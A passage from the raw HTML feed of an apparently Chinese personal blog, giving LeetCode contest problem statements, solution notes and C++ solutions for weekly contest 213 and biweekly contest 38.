class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">furthestBuilding</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; heights, <span class="keyword">int</span> bricks, <span class="keyword">int</span> ladders)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = heights.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,less&lt;<span class="keyword">int</span>&gt;&gt; pq;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(heights[i] &gt; heights[i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">int</span> need = heights[i] - heights[i<span class="number">-1</span>];</span><br><span class="line">                pq.push(need);</span><br><span class="line">                bricks -= need;</span><br><span class="line">                <span class="keyword">while</span>(bricks &lt; <span class="number">0</span> &amp;&amp; ladders &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    bricks += pq.top();</span><br><span class="line">                    pq.pop();</span><br><span class="line">                    ladders--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(bricks &lt; <span class="number">0</span>  &amp;&amp; ladders == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5600-第-K-条最小指令"><a href="#5600-第-K-条最小指令" class="headerlink" title="5600. 第 K 条最小指令"></a>5600. 第 K 条最小指令</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><code>Bob</code> 站在单元格 <code>(0, 0)</code>，想要前往目的地 <code>destination ：(row, column)</code>。他只能向 右 或向 下 走。你可以为 <code>Bob</code> 提供导航 指令 来帮助他到达目的地 <code>destination</code> 。</p><p>指令 用字符串表示，其中每个字符：</p><ul><li><code>&#39;H&#39;</code> ，意味着水平向右移动</li><li><code>&#39;V&#39;</code> ，意味着竖直向下移动<br>能够为 <code>Bob</code> 导航到目的地 <code>destination</code>的指令可以有多种，例如，如果目的地 <code>destination</code>是 (2, 3)，<code>&quot;HHHVV&quot;</code> 和 <code>&quot;HVHVH&quot;</code>都是有效 指令 。</li></ul><p>然而，<code>Bob</code> 很挑剔。因为他的幸运数字是 k，他想要遵循 按字典序排列后的第 <code>k</code>条最小指令 的导航前往目的地 <code>destination</code>。k  的编号 从 1 开始 。</p><p>给你一个整数数组 <code>destination</code> 和一个整数 k ，请你返回可以为 <code>Bob</code> 提供前往目的地 <code>destination</code> 导航的 按字典序排列后的第 k 条最小指令 。</p><p>示例 1：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">输入：destination = [<span class="number">2</span>,<span class="number">3</span>], k = <span class="number">1</span></span><br><span class="line">输出：<span class="string">"HHHVV"</span></span><br><span class="line">解释：能前往 (<span class="number">2</span>, <span class="number">3</span>) 的所有导航指令 按字典序排列后 如下所示：</span><br><span class="line">[<span class="string">"HHHVV"</span>, <span class="string">"HHVHV"</span>, <span class="string">"HHVVH"</span>, <span class="string">"HVHHV"</span>, <span class="string">"HVHVH"</span>, <span class="string">"HVVHH"</span>, <span class="string">"VHHHV"</span>, <span class="string">"VHHVH"</span>, <span class="string">"VHVHH"</span>, <span class="string">"VVHHH"</span>].</span><br></pre></td></tr></table></figure><p>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：destination = [<span class="number">2</span>,<span class="number">3</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="string">"HHVHV"</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：destination = [<span class="number">2</span>,<span class="number">3</span>], k = <span class="number">3</span></span><br><span class="line">输出：<span class="string">"HHVVH"</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>destination.length == 2</code></li><li><code>1 &lt;= row, column &lt;= 15</code></li><li><code>1 &lt;= k &lt;= nCr(row + column, row)</code>，其中 <code>nCr(a, b)</code> 表示组合数，即从 a 个物品中选 b 个物品的不同方案数。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/kthd-smallest-instructions" target="_blank" rel="noopener">https://leetcode-cn.com/problems/kthd-smallest-instructions</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 排列组合</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们利用排列组合即可，我们知道假设当前由<code>m</code>行,<code>n</code>列，则可能的路径方案数为$C_{m+n}^{n}$.</li><li>我们同时知道字典序<code>V</code> &gt; <code>H</code>,假设当前有<code>m</code>行,<code>n</code>列，如果当前字符选择为<code>V</code>,此时我们可以知道在后续的组合中最多只有$C_{m+n-1}^{m-1}$种；如果我们如果选择<code>H</code>的话，则在后续的组合中最多只有$C_{m+n-1}^{m}$种，我们知道当前选择<code>V</code>的方案的目标字符串肯定当前选择<code>H</code>的字符串的字典序大，因此我们如果选择了<code>V</code>,则我们需要将已经跳过的比其字典序小的字符串的个数减去即可。</li><li>所以每次我们判断如果当前的$K$与$C_{m+n-1}^{m}$的大小进行比较，如果存在$K &gt; C_{m+n-1}^{m}$,则我们肯定可以判定当前的字符肯定应该为<code>V</code>,因为其可以跳过字典序较小的字符，否则当前的字符为<code>H</code>。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> C[<span class="number">32</span>][<span class="number">32</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">kthSmallestPath</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; destination, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="built_in">memset</span>(C,<span class="number">0</span>,<span class="keyword">sizeof</span>(C));</span><br><span class="line">        <span class="keyword">int</span> row = destination[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> col = destination[<span class="number">1</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*initial*/</span></span><br><span class="line">        C[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= row + col; ++i)&#123;</span><br><span class="line">            C[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; ++j)&#123;</span><br><span class="line">                C[i][j] = C[i<span class="number">-1</span>][j] + C[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(row &gt; <span class="number">0</span> &amp;&amp; col &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k &gt; C[row+col<span class="number">-1</span>][row])&#123;</span><br><span class="line">                ans.push_back(<span class="string">'V'</span>);</span><br><span class="line">                k -= C[row+col<span class="number">-1</span>][row];</span><br><span class="line">                row--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans.push_back(<span class="string">'H'</span>);</span><br><span class="line">                col--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; col; ++i) ans.push_back(<span class="string">'H'</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i) ans.push_back(<span class="string">'V'</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-213&quot;&gt;&lt;a href=&quot;#leetcode-contest-213&quot; class=&quot;headerlink&quot; title=&quot;leetcode contest 213&quot;&gt;&lt;/a&gt;leetcode contest 213&lt;/h1&gt;&lt;p&gt;周赛的题目竟然比双周赛还简单。&lt;/p&gt;&lt;h2 id=&quot;5554-能否连接形成数组&quot;&gt;&lt;a href=&quot;#5554-能否连接形成数组&quot; class=&quot;headerlink&quot; title=&quot;5554. 能否连接形成数组&quot;&gt;&lt;/a&gt;5554. 能否连接形成数组&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个整数数组 &lt;code&gt;arr&lt;/code&gt;，数组中的每个整数 互不相同 。另有一个由整数数组构成的数组 &lt;code&gt;pieces&lt;/code&gt;，其中的整数也 互不相同 。请你以 任意顺序 连接 &lt;code&gt;pieces&lt;/code&gt;中的数组以形成 &lt;code&gt;arr&lt;/code&gt; 。但是，不允许 对每个数组 &lt;code&gt;pieces[i]&lt;/code&gt;中的整数重新排序。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】 双周赛38周</title>
    <link href="http://yoursite.com/2020/11/01/217/"/>
    <id>http://yoursite.com/2020/11/01/217/</id>
    <published>2020-10-31T16:11:14.922Z</published>
    <updated>2020-11-01T02:30:01.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biweekly-contest-38"><a href="#leetcode-biweekly-contest-38" class="headerlink" title="leetcode  biweekly contest 38"></a>leetcode  biweekly contest 38</h1><p>双周赛题目质量不行，第三题太垃圾的题目，竟然暴力就可以过。<br><img src="https://i.loli.net/2020/11/01/nXdUkOy95ZR1A2H.png" alt="1"></p><h2 id="5539-按照频率将数组升序排序"><a href="#5539-按照频率将数组升序排序" class="headerlink" title="5539. 按照频率将数组升序排序"></a>5539. 按照频率将数组升序排序</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums</code> ，请你将数组按照每个值的频率 升序 排序。如果有多个值的频率相同，请你按照数值本身将它们 降序 排序。<br>请你返回排序后的数组。</p><a id="more"></a><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-38/problems/sort-array-by-increasing-frequency/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-38/problems/sort-array-by-increasing-frequency/</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  排序</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>统计频率，然后排序即可<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; frequencySort(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;d</span><br><span class="line">        <span class="built_in">vector</span>&lt;pii&gt; arr;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums)&#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : cnt)&#123;</span><br><span class="line">            arr.push_back(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> cmp = [&amp;](pii &amp; a,pii &amp; b)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a.second == b.second) <span class="keyword">return</span> a.first &gt; b.first;</span><br><span class="line">            <span class="keyword">return</span> a.second &lt; b.second;</span><br><span class="line">        &#125;;</span><br><span class="line">        sort(arr.begin(),arr.end(),cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : arr)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.second; ++i)&#123;</span><br><span class="line">                ans.push_back(v.first);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5540-两点之间不包含任何点的最宽垂直面积"><a href="#5540-两点之间不包含任何点的最宽垂直面积" class="headerlink" title="5540. 两点之间不包含任何点的最宽垂直面积"></a>5540. 两点之间不包含任何点的最宽垂直面积</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你 n 个二维平面上的点 <code>points</code>，其中 <code>points[i] = [xi, yi]</code> ，请你返回两点之间内部不包含任何点的 最宽垂直面积 的宽度。</p><p>垂直面积 的定义是固定宽度，而 y 轴上无限延伸的一块区域（也就是高度为无穷大）。 最宽垂直面积 为宽度最大的一个垂直面积。</p><p>请注意，垂直区域 边上 的点 不在 区域内。<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例 <span class="number">1</span>：</span><br><span class="line">输入：points = [[<span class="number">8</span>,<span class="number">7</span>],[<span class="number">9</span>,<span class="number">9</span>],[<span class="number">7</span>,<span class="number">4</span>],[<span class="number">9</span>,<span class="number">7</span>]]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：红色区域和蓝色区域都是最优区域。</span><br></pre></td></tr></table></figure></p><p>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：points = [[<span class="number">3</span>,<span class="number">1</span>],[<span class="number">9</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">3</span>],[<span class="number">8</span>,<span class="number">8</span>]]</span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == points.length</code></li><li><code>2 &lt;= n &lt;= 105</code></li><li><code>points[i].length == 2</code></li><li><code>0 &lt;= xi, yi &lt;= 109</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-38/problems/widest-vertical-area-between-two-points-containing-no-points/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-38/problems/widest-vertical-area-between-two-points-containing-no-points/</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 按照横坐标排序即可</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>题目非常简单，直接按照横坐标排序即可，不晓得这个题目有什么意义。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxWidthOfVerticalArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = points.size();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">auto</span> cmp = [&amp;](<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)&#123;</span><br><span class="line">            <span class="keyword">return</span> a[<span class="number">0</span>] &lt; b[<span class="number">0</span>];</span><br><span class="line">        &#125;;</span><br><span class="line">        sort(points.begin(),points.end(),cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            ans = max(ans,points[i][<span class="number">0</span>] - points[i<span class="number">-1</span>][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5548-最小体力消耗路径"><a href="#5548-最小体力消耗路径" class="headerlink" title="5548. 最小体力消耗路径"></a>5548. 最小体力消耗路径</h2><p>给你两个字符串 <code>s</code>和<code>t</code>，请你找出 <code>s</code>中的非空子串的数目，这些子串满足替换 一个不同字符 以后，是 t 串的子串。换言之，请你找到 s 和 t 串中 恰好 只有一个字符不同的子字符串对的数目。</p><p>比方说， <code>&quot;computer&quot;</code>和 <code>&quot;computation&quot;</code> 加粗部分只有一个字符不同： <code>&#39;e&#39;/&#39;a&#39;</code> ，所以这一对子字符串会给答案加 1 。</p><p>请你返回满足上述条件的不同子字符串对数目。</p><p>一个 子字符串 是一个字符串中连续的字符。</p><p>示例 1：<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"aba"</span>, <span class="built_in">t</span> = <span class="string">"baba"</span></span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：以下为只相差 <span class="number">1</span> 个字符的 s 和 <span class="built_in">t</span> 串的子字符串对：</span><br><span class="line">(<span class="string">"aba"</span>, <span class="string">"baba"</span>)</span><br><span class="line">(<span class="string">"aba"</span>, <span class="string">"baba"</span>)</span><br><span class="line">(<span class="string">"aba"</span>, <span class="string">"baba"</span>)</span><br><span class="line">(<span class="string">"aba"</span>, <span class="string">"baba"</span>)</span><br><span class="line">(<span class="string">"aba"</span>, <span class="string">"baba"</span>)</span><br><span class="line">(<span class="string">"aba"</span>, <span class="string">"baba"</span>)</span><br><span class="line">加粗部分分别表示 s 和 <span class="built_in">t</span> 串选出来的子字符串。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"ab"</span>, <span class="built_in">t</span> = <span class="string">"bb"</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：以下为只相差 <span class="number">1</span> 个字符的 s 和 <span class="built_in">t</span> 串的子字符串对：</span><br><span class="line">(<span class="string">"ab"</span>, <span class="string">"bb"</span>)</span><br><span class="line">(<span class="string">"ab"</span>, <span class="string">"bb"</span>)</span><br><span class="line">(<span class="string">"ab"</span>, <span class="string">"bb"</span>)</span><br><span class="line">加粗部分分别表示 s 和 <span class="built_in">t</span> 串选出来的子字符串。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">s</span> = <span class="string">"a"</span>, <span class="attr">t</span> = <span class="string">"a"</span></span><br><span class="line">输出：<span class="number">0</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">s</span> = <span class="string">"abe"</span>, <span class="attr">t</span> = <span class="string">"bbc"</span></span><br><span class="line">输出：<span class="number">10</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= s.length, t.length &lt;= 100</code></li><li><code>s</code> 和 <code>t</code> 都只包含小写英文字母。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-38/problems/count-substrings-that-differ-by-one-character/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-38/problems/count-substrings-that-differ-by-one-character/</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 暴力</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>这个题目看了半个小时没啥好思路，最后干脆直接暴力，求出所有的子数组，然后比较，竟然暴力就过了，太没意思的题目。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">valid</span><span class="params">(<span class="built_in">string</span> &amp; a,<span class="built_in">string</span> &amp; b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.size(); ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i] != b[i]) ans++;</span><br><span class="line">            <span class="keyword">if</span>(ans &gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = s.size();</span><br><span class="line">        <span class="keyword">int</span> n = t.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; arr1;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; arr2;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m-i; ++j)&#123;</span><br><span class="line">                arr1.push_back(s.substr(j,i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= n-i; ++j)&#123;</span><br><span class="line">                arr2.push_back(t.substr(j,i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr1.size(); ++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; arr2.size(); ++k)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(valid(arr1[j],arr2[k])) ans++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size(), m = t.size();</span><br><span class="line">        <span class="keyword">int</span> mlen = min(n, m);</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i] == t[j])</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (i - (l + <span class="number">1</span>) &gt;= <span class="number">0</span> &amp;&amp; j - (l + <span class="number">1</span>) 